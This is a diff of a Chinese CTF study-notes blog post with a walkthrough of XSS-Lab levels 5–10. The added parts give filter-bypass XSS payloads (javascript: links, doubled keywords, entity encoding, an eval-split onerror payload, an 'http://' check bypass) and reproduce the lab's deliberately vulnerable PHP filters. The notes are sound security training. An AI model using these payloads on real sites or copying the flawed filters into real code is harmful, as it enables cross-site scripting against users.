@@ -31,11 +31,15 @@
 <meta property="og:site_name" content="CTF学习笔记">
 <meta property="og:description" content="XSS-Lab">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/QQ20250311-153115.png">
+<meta property="og:image" content="http://example.com/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/QQ20250311-152002.png">
+<meta property="og:image" content="http://example.com/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/0816e208464ef7415eca14bd8f76de8b%20(1).png">
 <meta property="article:published_time" content="2025-03-10T13:23:17.000Z">
-<meta property="article:modified_time" content="2025-03-11T06:44:56.650Z">
+<meta property="article:modified_time" content="2025-03-11T14:27:05.395Z">
 <meta property="article:author" content="温柔刀">
 <meta property="article:tag" content="xss">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/QQ20250311-153115.png">
 
 
 <link rel="canonical" href="http://example.com/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
@@ -118,7 +122,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS-Lab"><span class="nav-number">1.</span> <span class="nav-text">XSS-Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1"><span class="nav-number">1.1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2"><span class="nav-number">1.2.</span> <span class="nav-text">2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3"><span class="nav-number">1.3.</span> <span class="nav-text">3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4"><span class="nav-number">1.4.</span> <span class="nav-text">4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5"><span class="nav-number">1.5.</span> <span class="nav-text">5</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS-Lab"><span class="nav-number">1.</span> <span class="nav-text">XSS-Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1"><span class="nav-number">1.1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2"><span class="nav-number">1.2.</span> <span class="nav-text">2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3"><span class="nav-number">1.3.</span> <span class="nav-text">3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4"><span class="nav-number">1.4.</span> <span class="nav-text">4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5"><span class="nav-number">1.5.</span> <span class="nav-text">5</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-number">2.</span> <span class="nav-text">为什么？</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#6"><span class="nav-number">2.1.</span> <span class="nav-text">6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7"><span class="nav-number">2.2.</span> <span class="nav-text">7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8"><span class="nav-number">2.3.</span> <span class="nav-text">8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9"><span class="nav-number">2.4.</span> <span class="nav-text">9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10"><span class="nav-number">2.5.</span> <span class="nav-text">10</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -133,7 +137,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-count">55</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -213,7 +217,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-03-11 14:44:56" itemprop="dateModified" datetime="2025-03-11T14:44:56+08:00">2025-03-11</time>
+      <time title="修改时间：2025-03-11 22:27:05" itemprop="dateModified" datetime="2025-03-11T22:27:05+08:00">2025-03-11</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -246,14 +250,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>312</span>
+      <span>2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>7 分钟</span>
     </span>
 </div>
 
@@ -293,7 +297,114 @@
 <p>一直尝试，我说怎么不管用，关上hackbar弹窗怦怦跳。这里即使显示payload长度也能过</p>
 <h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;payload&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;scriptalert(&#x27;xss&#x27;)/script&quot;&gt;</span><br><span class="line"></span><br><span class="line">直接把&lt;&gt;替换掉了</span><br><span class="line"></span><br><span class="line">&quot;onclick =&#x27;javascript:alert(1)&#x27;//秒了</span><br></pre></td></tr></table></figure>
 
-<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;payload&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;o_nclick =&#x27;javascript:alert(1)&#x27;//&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;payload&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;o_nclick =&#x27;javascript:alert(1)&#x27;//&quot;&gt;</span><br><span class="line"></span><br><span class="line">考虑可以构造一个Payload闭合原有标签，重新创建一个新的标签a，在标签a引用script 超链接调用弹窗。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这样网页源代码为：</span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(&quot;xss&quot;)&quot;&gt;link&lt;/a&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>网上有博客写</p>
+<blockquote>
+<p>我们传入的<code>payload</code>中的<code>onmouseover</code>被替换成了<code>o_nmouseover</code>。</p>
+<p>有什么解决方法呢？</p>
+<ul>
+<li>使用大小写绕过，<code>html</code>对大小写不敏感 ×</li>
+<li>可以使用超链接的方式<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code>，注意闭合标签，构造<code>payload</code>为<code>test&quot;&gt;&lt;a href=&quot;javascript:alert(1)</code></li>
+<li>这里对<code>script</code>的过滤是对<code>&lt;script</code>进行的过滤，若是对整体<code>&lt;script&gt;</code>过滤的话，我们可以使用<code>&lt;script &gt;</code>来绕过.</li>
+<li>空格只能加在尾部，<code>&lt; script&gt;</code>是不符合要求的。</li>
+</ul>
+</blockquote>
+<p>大小写绕过没用这里，我写成”oNcLiCk &#x3D;’javascript:alert(1)’&#x2F;&#x2F;都不行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;test&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt; 这个可以</span><br><span class="line">输入payload之后点图片就行</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/QQ20250311-153115.png" class="" title="QQ20250311-153115">
+
+<blockquote>
+<p>Payload:”&gt;&lt;a href&#x3D;”javascript:alert(“XSS”)”&gt;link</a>&lt;“，最后点击一下link，就会跳出弹窗。</p>
+</blockquote>
+<p>这个也不行</p>
+<img src="/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/QQ20250311-152002.png" class="" title="QQ20250311-152002">
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">× <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&quot;</span><span class="attr">xss</span>&quot;)&quot;&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&lt;“&quot;&gt; </span><br><span class="line">√ <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<h1 id="为什么？"><a href="#为什么？" class="headerlink" title="为什么？"></a>为什么？</h1><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;payload&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&lt;scr_ipt&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">hr_ef</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&quot;&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这回倒是可以大小写绕过了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">hrEf</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;payload&quot;</span>&gt;</span></span><br><span class="line">把href替换掉了</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> =<span class="string">&quot;java:alert(1)&quot;</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>试了一下test”&gt;&lt;a hrefhref&#x3D;”javascript:alert(1)，同样，看来是循环的  <strong>请记住这里</strong></p>
+<p>测试发现src on href等都直接替换为空</p>
+<p>测一下这个</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                              <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span><br><span class="line">结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> =<span class="string">&quot;x&quot;</span> <span class="attr">error</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level8.php?keyword=nice try!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level7&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str =strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level7.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/0816e208464ef7415eca14bd8f76de8b%20(1).png" class="" title="0816e208464ef7415eca14bd8f76de8b (1)">
+
+<p>发现不是循环的</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">hhrefref</span>=<span class="string">&quot;javascript:alert(1)</span></span></span><br><span class="line"><span class="string"><span class="tag">结果发现图片能点，但是点不动</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;input name=keyword  value=&quot;</span><span class="attr">test</span>&quot;&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;java:alert(1)&quot;</span>&gt;</span> （忘记javascript了）</span><br><span class="line">test&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">hhrefref</span>=<span class="string">&quot;javascscriptript:alert(1)</span></span></span><br><span class="line"><span class="string"><span class="tag">    完成</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;test&amp;quot;&amp;gt;&amp;lt;a hhrefref=&amp;quot;javascscriptript:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们需要点这个友链来触发XSS</p>
+<p>ip&#x2F;javascr_ipt:alert(1)</p>
+<p>不想让他顾虑</p>
+<p>看wp说可以用<strong>html实体编码绕过</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;payload&quot;&gt;</span><br><span class="line">变成</span><br><span class="line">&lt;input name=keyword  value=&quot;javascript:alert(1)&quot;&gt;就行了</span><br></pre></td></tr></table></figure>
+
+<p>将字符javascript:alert(1)转化为实体，成功。</p>
+<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;payload&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level10.php?keyword=well done!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level9&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))                      # 看这里</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;     #看这里</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>这里补充一下strpos()函数</p>
+<p>strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。</p>
+<p>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。</p>
+<p>这里多了一行代码 if(false&#x3D;&#x3D;&#x3D;strpos($str7,’http:&#x2F;&#x2F;‘)),这里是检测传入的字符有没有http:&#x2F;&#x2F;，如果没有这个字符就会返回“您的连接不合法？有没有！“，所以我们将alert中加上这个字符就可以绕过了。<br>————————————————</p>
+<pre><code>                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
+</code></pre>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54438700/article/details/131723012">https://blog.csdn.net/weixin_54438700/article/details/131723012</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;http://&amp;lt;script&amp;gt;alert(&#x27;xss&#x27;)&amp;lt;/script&amp;gt;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;http://&lt;scr_ipt&gt;alert(&#x27;xss&#x27;)&lt;/scr_ipt&gt;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;http://javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;http://javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&lt;javascript:alert(1)&gt;的编码+//(注释掉)http://</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;a href=&quot;javascript:alert(1)&gt;的编码+ //http:// </span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和payload相关的结果.&lt;/h2&gt;&lt;center</span><br></pre></td></tr></table></figure>
+
